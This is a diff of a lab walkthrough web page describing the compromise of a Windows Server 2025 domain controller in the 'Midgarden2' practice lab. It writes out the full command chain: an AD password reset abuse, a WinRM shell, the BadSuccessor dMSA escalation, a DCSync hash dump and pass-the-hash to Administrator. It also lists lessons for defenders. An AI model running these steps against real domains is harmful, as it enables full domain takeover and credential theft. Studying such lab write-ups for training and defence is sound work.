@@ -107,6 +107,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -164,7 +174,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>Midgarden2</h2>
+  <h2 id="midgarden2">Midgarden2</h2>
   <p><em>Published: January 2026 | HackSmarter Labs</em></p>
 
   <div class="machine-info">
@@ -180,21 +190,21 @@
     <strong>Disclaimer:</strong> This walkthrough documents techniques used during an authorized penetration testing engagement. The methods described should only be used in controlled lab environments or with explicit written authorization. Unauthorized access to computer systems is illegal.
   </div>
 
-  <h2>Overview</h2>
+  <h2 id="overview">Overview</h2>
   <p>As a member of the Hack Smarter Red Team, the objective is to conduct a comprehensive penetration test of the client's internal environment. The client has a mature security posture with prior penetration testing experience. The goal is to identify overlooked attack vectors.</p>
 
   <div class="key-finding">
     <strong>Starting Credentials:</strong> <code>freyja:Fr3yja!Dr@g0n^12</code>
   </div>
 
-  <h2>Reconnaissance</h2>
+  <h2 id="reconnaissance">Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> Credential Validation</h3>
+  <h3 id="credential-validation"><span class="step">[Step 1]</span> Credential Validation</h3>
   <p>First, I validated the provided credentials using NetExec to confirm domain access:</p>
   <pre><code>$ nxc smb 10.1.17.238 -u freyja -p 'Fr3yja!Dr@g0n^12'
 SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0n^12</code></pre>
 
-  <h3><span class="step">[Step 2]</span> Port Scan</h3>
+  <h3 id="port-scan"><span class="step">[Step 2]</span> Port Scan</h3>
   <p>A comprehensive port scan revealed the target is a Windows Server 2025 Domain Controller:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.17.238</code></pre>
 
@@ -209,19 +219,19 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
     <strong>Note:</strong> Windows Server 2025 introduces new features like delegated Managed Service Accounts (dMSAs), which as we will see, can be exploited using the BadSuccessor vulnerability.
   </div>
 
-  <h2>Domain Enumeration</h2>
+  <h2 id="domain-enumeration">Domain Enumeration</h2>
 
-  <h3><span class="step">[Step 3]</span> User Enumeration</h3>
+  <h3 id="user-enumeration"><span class="step">[Step 3]</span> User Enumeration</h3>
   <p>During user enumeration, I discovered a password stored in a user description field - a common misconfiguration:</p>
   <pre><code>$ nxc smb 10.1.17.238 -u freyja -p 'Fr3yja!Dr@g0n^12' --users</code></pre>
 
   <p><img src="../assets/midgarden2/thor-password-description.png" alt="Thor user has password in description field" loading="lazy"></p>
 
-  <h3><span class="step">[Step 4]</span> BloodHound Collection</h3>
+  <h3 id="bloodhound-collection"><span class="step">[Step 4]</span> BloodHound Collection</h3>
   <p>With Thor's credentials, I collected domain data for BloodHound analysis:</p>
   <pre><code>$ nxc ldap 10.1.17.238 -u Thor -p '[REDACTED]' --bloodhound --collection All</code></pre>
 
-  <h3><span class="step">[Step 5]</span> Attack Path Analysis</h3>
+  <h3 id="attack-path-analysis"><span class="step">[Step 5]</span> Attack Path Analysis</h3>
   <p>BloodHound revealed a clear attack path. Thor has <strong>ForceChangePassword</strong> rights over the Hodr account:</p>
 
   <p><img src="../assets/midgarden2/bloodhound-thor-hodr.png" alt="Thor can force change Hodr's password" loading="lazy"></p>
@@ -230,13 +240,13 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
 
   <p><img src="../assets/midgarden2/hodr-remote-management.png" alt="Hodr is member of Remote Management Users" loading="lazy"></p>
 
-  <h2>Lateral Movement</h2>
+  <h2 id="lateral-movement">Lateral Movement</h2>
 
-  <h3><span class="step">[Step 6]</span> Password Reset</h3>
+  <h3 id="password-reset"><span class="step">[Step 6]</span> Password Reset</h3>
   <p>Using Thor's ForceChangePassword privilege, I reset Hodr's password:</p>
   <pre><code>$ net rpc password 'Hodr' 'Zerotrace123!' -U 'yggdrasil.hacksmarter'/'Thor'%'[REDACTED]' -S MidgardDC.yggdrasil.hacksmarter</code></pre>
 
-  <h3><span class="step">[Step 7]</span> WinRM Shell</h3>
+  <h3 id="winrm-shell"><span class="step">[Step 7]</span> WinRM Shell</h3>
   <p>With the new password, I established a WinRM session as Hodr:</p>
   <pre><code>$ evil-winrm -i 10.1.17.238 -u Hodr -p 'Zerotrace123!'
 
@@ -246,9 +256,9 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
     <strong>User flag:</strong> <code>C:\Users\Hodr.YGGDRASIL\Desktop\user.txt</code>
   </div>
 
-  <h2>Privilege Escalation: BadSuccessor Attack</h2>
+  <h2 id="privilege-escalation-badsuccessor-attack">Privilege Escalation: BadSuccessor Attack</h2>
 
-  <h3><span class="step">[Step 8]</span> dMSA Discovery</h3>
+  <h3 id="dmsa-discovery"><span class="step">[Step 8]</span> dMSA Discovery</h3>
   <p>Exploring the system, I found PowerShell scripts for dMSA management in <code>C:\scripts</code>:</p>
   <pre><code>*Evil-WinRM* PS C:\scripts> .\dmsa_find.ps1
 
@@ -264,7 +274,7 @@ Delegation    : Legacy / Not Delegated</code></pre>
     <p>dMSAs are a new feature in Windows Server 2025 designed to replace legacy service accounts. They automatically rotate passwords and can inherit permissions from predecessor accounts during migration. This "inheritance" mechanism is the core of the BadSuccessor vulnerability.</p>
   </div>
 
-  <h3><span class="step">[Step 9]</span> Understanding the BadSuccessor Vulnerability</h3>
+  <h3 id="understanding-the-badsuccessor-vulnerability"><span class="step">[Step 9]</span> Understanding the BadSuccessor Vulnerability</h3>
   <p>The BadSuccessor vulnerability (discovered by <a href="https://www.akamai.com/blog/security-research" target="_blank" rel="noopener noreferrer">Akamai</a> researcher Yuval Gordon in May 2025) exploits a critical flaw in dMSA migration:</p>
 
   <ol>
@@ -281,7 +291,7 @@ Delegation    : Legacy / Not Delegated</code></pre>
     <li>OR <code>WriteProperty</code> on an existing dMSA</li>
   </ul>
 
-  <h3><span class="step">[Step 10]</span> Finding Vulnerable OUs</h3>
+  <h3 id="finding-vulnerable-ous"><span class="step">[Step 10]</span> Finding Vulnerable OUs</h3>
   <p>I enumerated OUs to find where we have the necessary permissions:</p>
   <pre><code class="language-powershell">Import-Module ActiveDirectory
 
@@ -302,13 +312,13 @@ foreach ($OU in $OUs) {
 
   <p>The <code>webServerAdmins</code> group (which Hodr is a member of) has <strong>CreateChild</strong> permissions on the "Web Servers" OU - exactly what we need for the BadSuccessor attack.</p>
 
-  <h3><span class="step">[Step 11]</span> Automated Check with NetExec</h3>
+  <h3 id="automated-check-with-netexec"><span class="step">[Step 11]</span> Automated Check with NetExec</h3>
   <p>NetExec has a built-in module to check for BadSuccessor vulnerability:</p>
   <pre><code>$ nxc ldap 10.1.17.238 -u Hodr -p 'Zerotrace123!' -M badsuccessor</code></pre>
 
   <p><img src="../assets/midgarden2/netexec-badsuccessor.png" alt="NetExec confirms BadSuccessor vulnerability" loading="lazy"></p>
 
-  <h3><span class="step">[Step 12]</span> Exploitation with BloodyAD</h3>
+  <h3 id="exploitation-with-bloodyad"><span class="step">[Step 12]</span> Exploitation with BloodyAD</h3>
   <p>First, I installed <a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener noreferrer">BloodyAD</a> for the exploitation:</p>
   <pre><code>$ python3 -m venv .venv
 $ source .venv/bin/activate
@@ -324,9 +334,9 @@ $ pip install bloodyad</code></pre>
 
   <p>The tool outputs a Kerberos ccache file with Administrator privileges, ready for immediate use.</p>
 
-  <h2>Post-Exploitation</h2>
+  <h2 id="post-exploitation">Post-Exploitation</h2>
 
-  <h3><span class="step">[Step 13]</span> Kerberos Configuration</h3>
+  <h3 id="kerberos-configuration"><span class="step">[Step 13]</span> Kerberos Configuration</h3>
   <p>To use the obtained Kerberos ticket, I configured the local Kerberos environment:</p>
   <pre><code>$ sudo apt install krb5-user</code></pre>
 
@@ -350,7 +360,7 @@ $ pip install bloodyad</code></pre>
   <p>Update <code>/etc/hosts</code>:</p>
   <pre><code>10.1.66.173     yggdrasil.hacksmarter MidgardDC MidgardDC.yggdrasil.hacksmarter</code></pre>
 
-  <h3><span class="step">[Step 14]</span> DCSync Attack</h3>
+  <h3 id="dcsync-attack"><span class="step">[Step 14]</span> DCSync Attack</h3>
   <p>With the malicious dMSA ticket, I performed a DCSync attack to dump all domain secrets:</p>
   <pre><code>$ export KRB5CCNAME=evil_dmsa1_Pv.ccache
 
@@ -363,9 +373,9 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
     <p>DCSync abuses domain replication protocols to request password hashes from a Domain Controller, effectively extracting the entire NTDS.dit database remotely. It requires <strong>Replicating Directory Changes (All)</strong> permissions, which domain controllers and certain privileged accounts possess. The malicious dMSA inherits these permissions from the Administrator account.</p>
   </div>
 
-  <h2>Root Flag</h2>
+  <h2 id="root-flag">Root Flag</h2>
 
-  <h3><span class="step">[Step 15]</span> Domain Admin Access</h3>
+  <h3 id="domain-admin-access"><span class="step">[Step 15]</span> Domain Admin Access</h3>
   <p>Using the extracted Administrator NTLM hash, I established a privileged session:</p>
   <pre><code>$ evil-winrm -i 10.1.17.238 -u Administrator -H '[REDACTED]'
 
@@ -373,7 +383,7 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
 
   <p><img src="../assets/midgarden2/administrator-shell.png" alt="Administrator shell access" loading="lazy"></p>
 
-  <h2>Tools Used</h2>
+  <h2 id="tools-used">Tools Used</h2>
 
   <ul class="tools-list">
     <li>NetExec (nxc)</li>
@@ -383,7 +393,7 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
     <li>Impacket secretsdump.py</li>
   </ul>
 
-  <h2>Attack Chain Summary</h2>
+  <h2 id="attack-chain-summary">Attack Chain Summary</h2>
 
   <div class="attack-chain">
     <ol>
@@ -396,9 +406,9 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
     </ol>
   </div>
 
-  <h2>Lessons Learned</h2>
+  <h2 id="lessons-learned">Lessons Learned</h2>
 
-  <h3><span class="step defender">For Defenders</span></h3>
+  <h3 id="for-defenders"><span class="step defender">For Defenders</span></h3>
   <ul>
     <li><strong>Never store passwords in AD description fields</strong> - This is a common misconfiguration easily detected by attackers</li>
     <li><strong>Audit ACLs on OUs</strong> - CreateChild permissions can enable devastating attacks like BadSuccessor</li>
@@ -407,7 +417,7 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
     <li><strong>Defense in depth</strong> - Multiple controls are needed to prevent privilege escalation chains</li>
   </ul>
 
-  <h3><span class="step redteam">For Pentesters</span></h3>
+  <h3 id="for-pentesters"><span class="step redteam">For Pentesters</span></h3>
   <ul>
     <li>Always enumerate AD description fields for credentials</li>
     <li>BloodHound remains essential for identifying attack paths</li>
@@ -415,7 +425,7 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
     <li>Stay current with CVE disclosures and tooling updates</li>
   </ul>
 
-  <h2>References</h2>
+  <h2 id="references">References</h2>
   <ul>
     <li><a href="https://www.akamai.com/blog/security-research" target="_blank" rel="noopener noreferrer">Akamai BadSuccessor Research</a></li>
     <li><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener noreferrer">BloodyAD Documentation</a></li>
